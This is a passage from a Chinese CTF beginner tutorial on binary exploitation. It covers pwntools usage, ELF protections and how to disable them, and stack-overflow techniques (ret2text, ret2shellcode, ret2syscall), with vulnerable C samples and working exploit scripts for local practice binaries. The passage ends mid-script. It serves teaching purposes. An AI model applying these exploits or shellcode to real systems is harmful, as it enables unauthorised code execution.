class="string">asm()接收一个字符串，返回汇编码的机器码(bytes)</span></span><br><span class="line"><span class="string">比如:</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&#x27;mov eax, 0x10&#x27;)</span></span><br><span class="line"><span class="string">b&#x27;\xb8\x10\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">shellcraft模块是shellcode的模块，包含一些生成shellcode的函数</span></span><br><span class="line"><span class="string">这里shellcraft.sh()就是执行/bin/sh的shellcode</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># 将控制权还给用户，即用户可在终端直接与进程交互</span></span><br><span class="line"><span class="comment"># 在getshell之后使用，一般就放在脚本最后就行了</span></span><br></pre></td></tr></table></figure><h4 id="send-or-receive"><a href="#send-or-receive" class="headerlink" title="send or receive"></a>send or receive</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.send(payload)<span class="comment"># 将payload发送到远程连接</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;payload叫攻击载荷，实际上就是你要发送的数据，叫这个名字只是惯例了，你也可以叫其他任何合法的变量名&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># 与send相比是在发送完payload后会多发送一个回车(&#x27;\n&#x27;)</span></span><br><span class="line">io.sendafter(message, payload)</span><br><span class="line">io.sendlineafter(message, payload)</span><br><span class="line"><span class="comment"># 这两个很好理解，就是在接收到message之后再发送payload</span></span><br><span class="line"><span class="comment"># message不需要是接受到的一整个消息，可以是其中的片段</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br><span class="line"><span class="comment"># 接收所有数据，返回接收到的数据</span></span><br><span class="line"><span class="comment"># 可以接收一个int参数，表示接收多少个字节</span></span><br><span class="line"><span class="comment"># recv(6) 就表示接收6个字节</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">比如你收到了一段消息: b&#x27;hello,world!&#x27;</span></span><br><span class="line"><span class="string">recv(6) 就会返回 b&#x27;hello,&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.recvuntil(message)</span><br><span class="line"><span class="comment"># 接收到message后停止接收，返回包含message在内的全部数据</span></span><br><span class="line"><span class="comment"># 可以指定一个drop: bool参数，默认为False，若为True则只返回message之前的数据(message被抛弃了)</span></span><br><span class="line"><span class="comment"># 当然如果你继续接收数据的话是不会重新接收一遍message了，只会从message之后继续接收</span></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># 接收一行数据并返回，等价于 recvuntil(b&#x27;\n&#x27;)</span></span><br></pre></td></tr></table></figure><p><strong>上述发送和接收的方法均能接受<code>str</code>或<code>bytes</code>类型的参数</strong></p><h4 id="数据打包"><a href="#数据打包" class="headerlink" title="数据打包"></a>数据打包</h4><p>pwntools里可以用pack和unpack函数把int打包为bytes，或者把bytes解包为int</p><p>一般直接用封装好的p16&#x2F;p32&#x2F;p64, u16&#x2F;u32&#x2F;u64（好像用vs会警告吧，我自己用显示没在pwntools找到这玩意，反正能跑脚本就行）</p><p>打包 <code>p16/p32/p64</code>: 把一个整数分别打包为16，32或64位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p64(<span class="number">0x7ffff3283296</span>)</span><br><span class="line"><span class="string">b&#x27;\x962(\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># 即 b&#x27;\x96\x32\x28\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p16(<span class="number">0x256</span>)</span><br><span class="line"><span class="string">b&#x27;V\x20&#x27;</span></span><br><span class="line"><span class="comment"># 即 b&#x27;\x56\x02&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0x8004082</span>)</span><br><span class="line"><span class="string">b&#x27;\x82@\x00\x08</span></span><br><span class="line"><span class="string"># 即 b&#x27;</span>\x82\x40\x00\x08<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>解包 <code>u16/u32/u64</code>: 解包一个字符串（或bytes），得到整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">`<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">要注意u16,u32,u64接受的参数分别要是2，4，8个字节，否则会报错</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>addr1 = <span class="string">b&#x27;\x962(\xf3\xff\x7f&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u64(addr1)<span class="comment"># Error!!!</span></span><br><span class="line">...</span><br><span class="line">struct.error: unpack requires a buffer of <span class="number">8</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="comment"># 一般接受数据不确定有多长就可以用ljust来补到8个字节</span></span><br><span class="line"><span class="comment"># 类似的有zfill，rjust等，可以自行体会其中差异</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u64(addr1).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7ffff3283296&#x27;</span></span><br></pre></td></tr></table></figure><p>需要注意：如果待延长的数据是 <code>bytes</code>，<code>ljust</code>第二个参数也必须<code>bytes</code><br>如上例就是必须是 <code>b&#39;\x00&#39;</code>或者<code>b&#39;\0&#39;</code>, 不能是 <code>&#39;\x00&#39;</code>, <code>&#39;\0&#39;</code><br>如果是 <code>str</code> 类型也是一样道理</p><p><del><strong>当然如果你用 python2 就当我没说</strong></del></p><h4 id="输出数据"><a href="#输出数据" class="headerlink" title="输出数据"></a>输出数据</h4><p>输出当然可以用 <code>print</code></p><p>只不过建议用pwntools自带的输出方式，一方面吻合pwntools本来的格式，一方面看着比较舒适</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>out_str = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>log.info(out_str)</span><br><span class="line">[*] hello, world</span><br><span class="line"><span class="comment"># info代表log等级，也可以用其他的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = log.progress(<span class="string">&#x27;Working&#x27;</span>)</span><br><span class="line">[x] Working</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;Reticulating splines&#x27;</span>)</span><br><span class="line">[x] Working: Reticulating splines</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;Get a shell!&#x27;</span>)</span><br><span class="line">[+] Working: Get a shell!</span><br><span class="line"><span class="comment"># 要注意如果p使用了success之后，就不能再用p输出了，当然不至于报错</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.status(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">no output</span><br><span class="line"><span class="comment"># 不过直接用success是可以的</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>success(<span class="string">&#x27;you did&#x27;</span>)</span><br><span class="line">[+] you did</span><br></pre></td></tr></table></figure><h4 id="Cyclic-pattern"><a href="#Cyclic-pattern" class="headerlink" title="Cyclic pattern"></a>Cyclic pattern</h4><p>使用pwntools生成一个pattern（一个str），可以通过其中的一部分数据定位其在一个字符串的位置</p><p>做栈溢出题目时，pattern可以减少计算溢出点的时间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cyclic(<span class="number">0x100</span>)<span class="comment"># 生成长度0x100的pattern</span></span><br><span class="line">cyclic_find(<span class="number">0x61616161</span>)<span class="comment"># 查找该数据在pattern的位置</span></span><br><span class="line">cyclic_find(<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment"># 可以用字符串查找</span></span><br><span class="line"><span class="comment"># 或者 cyclic -l 0x61616161</span></span><br><span class="line"><span class="comment"># 注: 在pwndbg中使用</span></span><br></pre></td></tr></table></figure><p>比如溢出时构造 <code>cyclic(0x100)</code> ，或者更长，输入后 PC的值变味了 <code>0x61616161</code> 通过 <code>cyclic_find(0x61616161) </code> 就可以得到从哪一个字节开始会控制PC寄存器</p><h4 id="ELF文件操作"><a href="#ELF文件操作" class="headerlink" title="ELF文件操作"></a>ELF文件操作</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/mnt/d/myCTFground/Pwn/Signin/ez_stack&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>使用ipython或者log_level &#x3D; ‘debug’ 的话就相当于是checksec了，</p><p>我们加载elf文件主要是为了获取一些符号信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.address)</span><br><span class="line"><span class="string">&#x27;0x400000&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x404008&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;0x401040&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>libc = ELF(<span class="string">&#x27;../libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line"><span class="string">&#x27;0x1b45bd&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ELF文件保护机制"><a href="#ELF文件保护机制" class="headerlink" title="ELF文件保护机制"></a>ELF文件保护机制</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>canary是金丝雀的意思。技术上表示最先测试的（要是在软件或者其他什么东西看到canary版，大概率就是指测试版了）。这种叫法来自以前挖煤时，矿工们会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会有预警。所以大家就会用canary来搞最先的测试。在栈中，<strong>canary表示栈的报警保护。</strong></p><p>canary的具体表现是在函数的栈底指针bp前添加一串随机数（不超过机器字长）（又叫cookie），末位是\x00，如果出现缓冲区溢出攻击，覆盖到canary处，并且导致改变该处数据后，<strong>当程序执行到此处（也就是当前函数要结束，准备跳转了），会检查canary值是否跟开始值一样，不一样会导致程序崩溃（应该会看到一串含有smashing的英文）</strong>，从而达到防止程序执行流被恶意控制的目的。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># canary示意图</span></span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">+-------------+ &lt;- </span><br><span class="line">|             | buffer</span><br><span class="line">|             |</span><br><span class="line">+-------------+</span><br><span class="line">|  canary     |</span><br><span class="line">+-------------+</span><br><span class="line">|    bp       |</span><br><span class="line">+-------------+</span><br><span class="line">|  ret addr   |</span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br></pre></td></tr></table></figure><p><strong>gcc使用：</strong></p><p><code>-fno-stack-protector / -fstack-protector / -fstack-protector-all</code> </p><p><strong>（关闭 &#x2F; 部分开启 &#x2F; 全部开启）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o filename filename.c// 默认不开启canary</span><br><span class="line">gcc -o filename -fno-stack-protector filename.c// 禁用canary</span><br><span class="line">gcc -o filename -fstack-protector filename.c// 启用canary，不过只为局部变量中含有char数组的函数插入canary保护</span><br><span class="line">gcc -o filename -fstack-protector-all filename.c// 启用canary，为所有函数插入保护代码</span><br></pre></td></tr></table></figure><h3 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h3><p>NX即No-eXecute（不可执行），NX（DEP）的表现为把数据所在内存页标识为不可执行，当程序溢出到shellcode时，程序会尝试执行指令，此时CPU会抛出异常，而不去执行恶意指令。</p><p><strong>gcc使用：</strong></p><p><code>-z execstack / -z noexecstack</code> </p><p><strong>（关闭 &#x2F; 开启）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c// 默认开启NX</span><br><span class="line">gcc -o file -z execstack file.c// 禁用NX</span><br><span class="line">gcc -o file -z noexecstack file.c// 开启NX</span><br></pre></td></tr></table></figure><h3 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h3><p>一般情况下NX（DEP）和地址空间分布随机化（PIE &#x2F; ASLR）（address space layout randomization）会同时工作。内存地址随机化机制有三种情况：</p><ul><li>0 - 表示关闭进程地址空间随机化</li><li>1 - 表示将mmap的基地址，栈基地址和.so地址随机化</li><li>2 - 表示在1的基础上增加heap的地址随机化</li></ul><p><strong>该保护使每次运行的程序地址都不同，防止根据固定地址来写exp执行攻击。</strong>这可以防止ret2libc方式针对DEP的攻击。ASLR和DEP配合使用，可以有效阻止攻击者在堆栈上运行恶意代码。</p><p><strong>linux下关闭PIE的命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p><strong>gcc用法：</strong></p><p><code>-no-pie / -pie</code></p><p><strong>（关闭 &#x2F; 开启）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c// 默认关闭PIE</span><br><span class="line">gcc -o file -fpie -pie file.c// 开启PIE，强度为1</span><br><span class="line">gcc -o file -fPIE -pie file.c// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -o file -fpic file.c// 开启PIC，强度为1，不会开启PIE</span><br><span class="line">gcc -o file -fPIC file.c// 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO（Relocation Read-Only）可以使程序某些部分标识为只读。分为两种情况：</p><ul><li><strong>Partial RELRO：</strong>是gcc的默认设置，几乎所有二进制文件都至少使用部分RELRO。这样仅能防止全局变量的缓冲区溢出导致覆盖GOT</li><li><strong>Full RELRO：</strong>使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动前需要解析所有符号</li></ul><p><em>linux系统安全领域里，有w（write）权限的储存区就会是攻击的目标，尤其是储存函数指针的区域。所以在安全角度应该尽量减少可写的区域</em></p><p><em>RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。</em></p><p><strong>可以简单理解为：</strong></p><ul><li><strong>Partial RELRO -&gt; .got不可写，got.plt（got表）可写</strong></li><li><strong>Full RELRO -&gt; .got 和 got.plt 不可写</strong></li></ul><p><strong>gcc使用：</strong></p><p><code>-z norelro / -z lazy / -z now</code></p><p><strong>（关闭 &#x2F; 部分开启 &#x2F; 完全开启）</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c// 默认为Partial RELRO</span><br><span class="line">gcc -o file -z norelro file.c// 关闭，即No RELRO</span><br><span class="line">gcc -o file -z lazy file.c// 部分开启，即Partial RELRO</span><br><span class="line">gcc -o file -z now file.c// 完全开启，即Full RELRO</span><br></pre></td></tr></table></figure><h3 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h3><p>fortify是轻微的检查，用于检测是否存在缓冲区溢出的错误，适用于程序采用大量字符串或内存操作函数，如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="是babyROP吧"><a href="#是babyROP吧" class="headerlink" title="是babyROP吧"></a>是babyROP吧</h2><p><strong>什么是ROP:</strong></p><p>类似于比较常听到的OOP（面向对象编程），POP（面向过程编程），FP（函数式编程）等。</p><p>ROP全称是Return-Oriented Programing（面向返回编程）。简单来说，<strong>ROP就是将源程序中散落的汇编程序片段（也称gadget）“拼接”在一起，使其能够为攻击者服务</strong>。 需要指出的是，此处的“拼接”不是指将这些汇编程序片段聚集在某个连续的内存空间中，而是让它们在逻辑上连续执行，也就是说构成一个”返回链“。ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p><p><strong>为什么要ROP:</strong></p><p>ROP主要是为了绕过NX(DEP)保护。<strong>NX(DEP)基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode，程序会尝试在数据页面执行指令，此时CPU就会抛出异常，而不是执行恶意指令。</strong>NX开启后，直接往栈上或堆上注入代码的方式难以继续发挥效果，所以有了各种绕过方法，rop是其中一种。</p><p><strong>rop攻击一般要满足：</strong></p><p>1）程序存在溢出，并且可以控制返回地址。</p><p>2）可以找到满足条件的gadget以及对应的gadget地址（如果gadget每次地址是不固定的，就要想办法动态获取对应地址了）</p><h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2text（ret to text）实际上就是一种ROP，只不过只返回一次而已（返回到text上），ret2text本质就是控制ret返回到已有的代码上如：system(“&#x2F;bin&#x2F;sh”)， execv(“&#x2F;bin&#x2F;sh”)，从而getshell。</p><p>写了一个简单的程序作为例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PS：编译时记得关掉canary和地址随机化</strong></p><p>建议直接在wsl里编译就好（懒得开虚拟机捏~）</p><p><code>gcc -o pwn -fno-stack-protector -no-pie pwn.c</code></p><p>scanf处没有对读取数据长度做检测，存在溢出</p><p>不过直接说可能不好理解，看一下ida吧</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_main.png" alt="main"></p><p>栈空间：</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_stack.png" alt="stack"></p><p>显然这里输入到了v4(对应到栈里面的var_30)，发现跟预想的0x20不一样，偷偷加了一些空间，而且多创建了一个不知道干什么的int变量。使用实际要填充的长度应该是</p><p><code>offset = 0x2c + 0x4 + 0x8 = 0x38</code></p><p>这里的0x2c是var_30的大小（可以看到左边一列数那里0x30和4相差了0x2c（不是26嗷））；</p><p>然后4个字节长度是var_4，也就是那个int变量的，这里是直接覆盖过去了；</p><p>然后后面的8个字节是rbp（i386就是4个字节（ebp）），可以看到s和r那里相差了8；</p><p>然后再覆盖新的返回地址（如果有后门函数就返回到那里就好了）</p><p>再一眼后门函数</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_binsh.png" alt="binsh"></p><p>发现&#x2F;bin&#x2F;sh字符串在0x401144传参，所以就返回到0x401144，于是写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x401144</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>即控制程序执行shellcode代码，shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>一般来说，shellcode要我们自己填充。</strong></p><p>在栈溢出的基础上，要执行shellcode，需要shellcode所在区域有可执行权限。（没有NX保护，或者用mprotect（）为一段区域赋予了可执行权限，或者bss段可执行）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    mprotect(<span class="number">0x401000</span>, <span class="number">0x1000</span>, <span class="number">7</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(<span class="number">0x401000</span>, buf);</span><br><span class="line">    ((<span class="type">void</span>(*)())<span class="number">0x401020</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就是把0x401000开始的长度为0x1000的区域标记为可执行，我们直接把shellcode传进去，即可getshell，由于copy发生在0x401000，但是从0x401020开始执行，所以我们先填充0x20各字节再填充shellcode</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>简单来说就是执行系统调用来实现想要实现的功能，比如可以用 <code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code> 系统调用来获取shell，这需要满足：</p><ul><li><p>系统调用号，eax 为 0xb(x86) &#x2F; rax 为 0x3b(x64)</p></li><li><p>第一个参数，ebx &#x2F; rdi 为 &#x2F;bin&#x2F;sh 地址</p></li><li><p>第二个参数，ecx 为 0 &#x2F; rsi 为 0</p></li><li><p>第三个参数，edx 为 0 &#x2F; rdx 为 0</p></li><li><p>最后返回 int 0x80(x86) &#x2F; syscall ret(x64)</p><p>看一道例题：<a href="../resources/pwn_asset/study/ret2sys_64" target="_blank">ret2sys_64</a></p></li></ul><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2sys_main.png" alt="main"></p><p>程序里面没有现成的&#x2F;bin&#x2F;sh，所以可以用两次系统调用，一次读字符串，一次拿sh</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2sys_64&#x27;</span>)</span><br><span class="line">rax = <span class="number">0x46b9f8</span></span><br><span class="line">rdi = <span class="number">0x4016c3</span></span><br><span class="line">rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">syscall = <span class="number">0x45bac5</span></span><br><span class="line">bss = <span class="number">0x6c1c60</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"><span class="comment"># 调用sys_read，用来读取后面输入的/bin/sh到bss段</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss) + p64(syscall)</span><br><span class="line"><span class="comment"># 